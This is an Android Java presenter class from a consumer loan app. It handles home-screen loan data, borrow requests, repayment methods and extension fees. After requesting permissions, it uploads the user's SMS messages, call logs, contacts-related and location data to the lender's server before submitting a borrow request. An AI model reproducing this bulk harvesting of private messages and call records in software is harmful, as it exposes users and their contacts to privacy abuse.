package com.lemontree.android.presenter;

import android.Manifest;
import android.app.Activity;
import android.app.ProgressDialog;
import android.content.Context;
import android.content.pm.PackageManager;
import android.os.Handler;
import android.os.Looper;
import android.util.Log;

import androidx.core.app.ActivityCompat;
import androidx.fragment.app.Fragment;

import com.google.gson.Gson;
import com.lemontree.android.BuildConfig;
import com.minchainx.permission.util.PermissionListener;
import com.networklite.NetworkLiteHelper;
import com.networklite.callback.GenericCallback;
import com.lemontree.android.R;
import com.lemontree.android.base.BasePresenter;
import com.lemontree.android.base.BaseResponseBean;
import com.lemontree.android.bean.request.CommonReqBean;
import com.lemontree.android.bean.request.GoBorrowReqBean;
import com.lemontree.android.bean.request.HomeDataRequestBean;
import com.lemontree.android.bean.response.BorrowApplyInfoResBean;
import com.lemontree.android.bean.response.BorrowResBean;
import com.lemontree.android.bean.response.GetExtendFeeResBean;
import com.lemontree.android.bean.response.GetPayWayListResBean;
import com.lemontree.android.bean.response.HomeDataResBean;
import com.lemontree.android.iview.IHomeView;
import com.lemontree.android.manager.BaseApplication;
import com.lemontree.android.manager.ConstantValue;
import com.lemontree.android.manager.NetConstantValue;
import com.lemontree.android.uploadUtil.Permission;
import com.lemontree.android.uploadUtil.UploadDataBySingle;
import com.lemontree.android.uploadUtil.UploadNecessaryData;
import com.lemontree.android.utils.CProgressDialogUtils;

import java.util.List;

import okhttp3.Call;

import static com.lemontree.android.network.OKHttpClientEngine.getNetworkClient;
import static com.lemontree.android.utils.UIUtils.showToast;

public class HomePresenter extends BasePresenter<IHomeView> {
    private Context mContext;
    private List<String> mUrlList;
    private boolean mDialogHasShowed;
    private String mOrderId;
    private BorrowApplyInfoResBean mBorrowApplyInfoResBean;
    private boolean mHasUpdateSmsSuccess;
    private boolean mHasUpdateCallLogSuccess;


    public HomePresenter(Context context, IHomeView view, Fragment fragment) {
        super(context, view, fragment);
        this.mContext = context;

        loadData(true);
    }

    public void loadData(boolean showLoading) {
        //获取首页主借款数据
        getHomeMainData();
    }

    /**
     * 获取首页主借款数据
     */
    public void getHomeMainData() {
        HomeDataRequestBean homeTabRequestBean = new HomeDataRequestBean();
        homeTabRequestBean.orderid = "";

//        CProgressDialogUtils.showProgressDialog((Activity) mContext);

        NetworkLiteHelper
                .postJson()
                .url(NetConstantValue.BASE_HOST + ConstantValue.NET_REQUEST_URL_HOMEPAGE_TAB)
                .content(new Gson().toJson(homeTabRequestBean))
                .build()
                .execute(getNetworkClient(), new GenericCallback<HomeDataResBean>() {

                    @Override
                    public void onSuccess(Call call, HomeDataResBean response, int id) {
//                        CProgressDialogUtils.cancelProgressDialog((Activity) mContext);
                        if (mView != null) {
                            mView.stopRefresh();
                        }
                        if (response != null) {
                            if (BaseResponseBean.SUCCESS.equals(response.res_code)) {
                                if (mView != null) {
                                    mView.setHomeData(response);
                                }
                                mOrderId = response.order_Id;
                            } else {
                                if (BuildConfig.DEBUG)
                                    showToast("Code:" + response.res_code + "," + response.res_msg + "");
                            }
                        }
                    }

                    @Override
                    public void onFailure(Call call, Exception exception, int id) {
                        if (mView != null) {
                            mView.stopRefresh();
                        }
                        showToast("failure");
                    }
                });
    }


    /**
     * 获取借款信息
     */
    public void getBorrowApplyInfo() {
        NetworkLiteHelper
                .postJson()
                .url(NetConstantValue.BASE_HOST + ConstantValue.NET_REQUEST_URL_BORROW_INFO)
                .content(new Gson().toJson(new CommonReqBean()))
                .build()
                .execute(getNetworkClient(), new GenericCallback<BorrowApplyInfoResBean>() {
                    @Override
                    public void onFailure(Call call, Exception exception, int id) {

                    }

                    @Override
                    public void onSuccess(Call call, BorrowApplyInfoResBean response, int id) {
                        if (response != null) {
                            if (BaseResponseBean.SUCCESS.equals(response.res_code)) {
                                if (mView != null) {
                                    mView.setBorrowInfo(response);
                                }
                                mBorrowApplyInfoResBean = response;
                            } else {
                                if (BuildConfig.DEBUG)
                                    showToast("Code:" + response.res_code + "," + response.res_msg + "");
                            }
                        }
                    }
                });
    }

    /**
     * 去借款
     */
    public void goBorrow() {
        if (mBorrowApplyInfoResBean != null) {
            GoBorrowReqBean bean = new GoBorrowReqBean();
            bean.customer_bank_card_id = mBorrowApplyInfoResBean.customer_bank_card_id;
            NetworkLiteHelper
                    .postJson()
                    .url(NetConstantValue.BASE_HOST + ConstantValue.NET_REQUEST_URL_CONFIRM_BORROW)
                    .content(new Gson().toJson(bean))
                    .build()
                    .execute(getNetworkClient(), new GenericCallback<BorrowResBean>() {
                        @Override
                        public void onFailure(Call call, Exception exception, int id) {

                        }

                        @Override
                        public void onSuccess(Call call, BorrowResBean response, int id) {
                            if (response != null) {
                                if (BaseResponseBean.SUCCESS.equals(response.res_code) && mView != null) {
                                    mView.showLoanInfoLayout();
                                    mView.refreshHomeData();
                                } else {
                                    showToast(response.res_msg + "");
                                }
                            }
                        }
                    });
        }
    }

    /**
     * 获取还款方式列表
     */
    public void getPayWayList() {
        NetworkLiteHelper
                .postJson()
                .url(NetConstantValue.BASE_HOST + NetConstantValue.GET_REPAY_WAY_LIST)
                .content(new Gson().toJson(new CommonReqBean()))
                .build()
                .execute(getNetworkClient(), new GenericCallback<GetPayWayListResBean>() {
                    @Override
                    public void onSuccess(Call call, GetPayWayListResBean response, int id) {
                        if (response != null && BaseResponseBean.SUCCESS.equals(response.res_code)) {
                            if (mView != null) {
                                mView.setPayWayData(response);
                            }
                        }
                    }

                    @Override
                    public void onFailure(Call call, Exception exception, int id) {
                    }
                });
    }

    /**
     * 还款码设置为失效
     */
    public void setPayCodeInvalid() {
        NetworkLiteHelper
                .postJson()
                .url(NetConstantValue.BASE_HOST + NetConstantValue.SET_PAY_CODE_INVALID)
                .content(new Gson().toJson(new CommonReqBean()))
                .build()
                .execute(getNetworkClient(), new GenericCallback<BaseResponseBean>() {
                    @Override
                    public void onSuccess(Call call, BaseResponseBean response, int id) {
                        if (response != null && BaseResponseBean.SUCCESS.equals(response.res_code)) {
                            Log.d("karl", "setPayCodeInvalid success");
                        }
                    }

                    @Override
                    public void onFailure(Call call, Exception exception, int id) {
                    }
                });
    }

    /**
     * 开始申请权限
     */
    public void requestPermissions() {

        new Permission(mContext, new String[]{
                Manifest.permission.ACCESS_FINE_LOCATION,
                Manifest.permission.READ_CONTACTS,
                Manifest.permission.READ_PHONE_STATE,//包含READ_CALL_LOG
                Manifest.permission.READ_SMS,
        }, new PermissionListener() {
            @Override
            public void onGranted() {
                Log.d("karl", "requestPermissions onGranted");
                uploadAccordingPermissions();
            }

            @Override
            public void onDenied() {
                Log.d("karl", "bbb:" + ActivityCompat.checkSelfPermission(mContext, Manifest.permission.READ_CONTACTS));
                Log.d("karl", "requestPermissions onDenied");
                uploadAccordingPermissions();
            }
        });
    }

    private void uploadAccordingPermissions() {
        if (isGetNecessaryPermission()) {
            Log.d("karl", "isGetNecessaryPermission");
            uploadNecessaryData();
        } else {
            showToast(R.string.allow_permission_and_try_again);
        }
        if (isGetSMSPermission()) {
            Log.d("karl", "isGetSMSPermission");
            Log.d("karl", "mHasUpdateSmsSuccess-" + mHasUpdateSmsSuccess);
            if (!mHasUpdateSmsSuccess) {
                uploadSmsOnly();
            }
        }
        if (isGetCallLogPermission()) {
            Log.d("karl", "isGetCallLogPermission");
            Log.d("karl", "mHasUpdateCallLogSuccess-" + mHasUpdateCallLogSuccess);
            if (!mHasUpdateCallLogSuccess) {
                uploadCallRecordOnly();
            }
        }
    }

    private boolean isGetNecessaryPermission() {
        return ActivityCompat.checkSelfPermission(mContext, Manifest.permission.ACCESS_FINE_LOCATION) == PackageManager.PERMISSION_GRANTED
                && ActivityCompat.checkSelfPermission(mContext, Manifest.permission.READ_PHONE_STATE) == PackageManager.PERMISSION_GRANTED
                && ActivityCompat.checkSelfPermission(mContext, Manifest.permission.READ_CONTACTS) == PackageManager.PERMISSION_GRANTED;
    }

    private boolean isGetSMSPermission() {
        return ActivityCompat.checkSelfPermission(mContext, Manifest.permission.READ_SMS) == PackageManager.PERMISSION_GRANTED;
    }

    private boolean isGetCallLogPermission() {
        return ActivityCompat.checkSelfPermission(mContext, Manifest.permission.READ_CALL_LOG) == PackageManager.PERMISSION_GRANTED;
    }

    /**
     * 上传数据
     */
    private void uploadNecessaryData() {
        final ProgressDialog dialog = new ProgressDialog(mContext);
        dialog.setMessage("Loading...");
        dialog.show();
        new UploadNecessaryData().upload(BaseApplication.mUserId, new UploadNecessaryData.UploadDataListener() {
            @Override
            public void success() {
                new Handler(Looper.getMainLooper()).post(new Runnable() {
                    @Override
                    public void run() {
                        Log.d("karl", "所有数据传输成功...");
                        goBorrow();
                        dialog.dismiss();
                    }
                });
            }

            @Override
            public void error() {

                new Handler(Looper.getMainLooper()).post(new Runnable() {
                    @Override
                    public void run() {
                        Log.e("karl", "所有数据传输失败...");
                        //失败情况也当成功处理
                        goBorrow();
                        dialog.dismiss();
                    }
                });
            }
        }, true);
    }


    /**
     * 满足条件时上传短信
     */
    public void prepareUploadSmsData() {
        new Permission(mContext, new String[]{Manifest.permission.READ_SMS}, new PermissionListener() {
            @Override
            public void onGranted() {
                uploadSmsOnly();
            }

            @Override
            public void onDenied() {

            }
        });
    }

    /**
     * 上传短信
     */
    private void uploadSmsOnly() {
        new UploadDataBySingle().uploadSms(BaseApplication.mUserId, new UploadDataBySingle.UploadSmsListener() {
            @Override
            public void success() {
//                UIUtils.showToast("上传短信成功");
                Log.d("karl", "上传短信成功");
                mHasUpdateSmsSuccess = true;
            }

            @Override
            public void error() {
                Log.d("karl", "上传短信error");

            }
        });
    }

    /**
     * 满足条件时上传通话记录
     */
    public void prepareUploadCallRecordData() {
        new Permission(mContext, new String[]{Manifest.permission.READ_CALL_LOG}, new PermissionListener() {
            @Override
            public void onGranted() {
                uploadCallRecordOnly();
            }

            @Override
            public void onDenied() {

            }
        });
    }

    /**
     * 上传通话记录
     */
    private void uploadCallRecordOnly() {
        new UploadDataBySingle().uploadCallRecord(BaseApplication.mUserId, new UploadDataBySingle.UploadCallRecordListener() {
            @Override
            public void success() {
//                UIUtils.showToast("上传短信成功");
                Log.d("karl", "上传通话记录成功");
                mHasUpdateCallLogSuccess = true;
            }

            @Override
            public void error() {
                Log.d("karl", "上传通话记录error");
            }
        });
    }

    /**
     * 获取展期费
     */
    public void getExtendFee() {
        CProgressDialogUtils.showProgressDialog((Activity) mContext);
        NetworkLiteHelper
                .postJson()
                .url(NetConstantValue.BASE_HOST + ConstantValue.NET_REQUEST_URL_EXTENT_FEE)
                .content(new Gson().toJson(new CommonReqBean()))
                .build()
                .execute(getNetworkClient(), new GenericCallback<GetExtendFeeResBean>() {

                    @Override
                    public void onSuccess(Call call, GetExtendFeeResBean response, int id) {
                        CProgressDialogUtils.cancelProgressDialog((Activity) mContext);
                        if (response != null && mView != null) {
                            mView.showExtendPageData(response.data + "");
                        }
                    }

                    @Override
                    public void onFailure(Call call, Exception exception, int id) {
                        CProgressDialogUtils.cancelProgressDialog((Activity) mContext);
                        showToast("Harap kembali dan coba lagi");
                    }
                });
    }
}
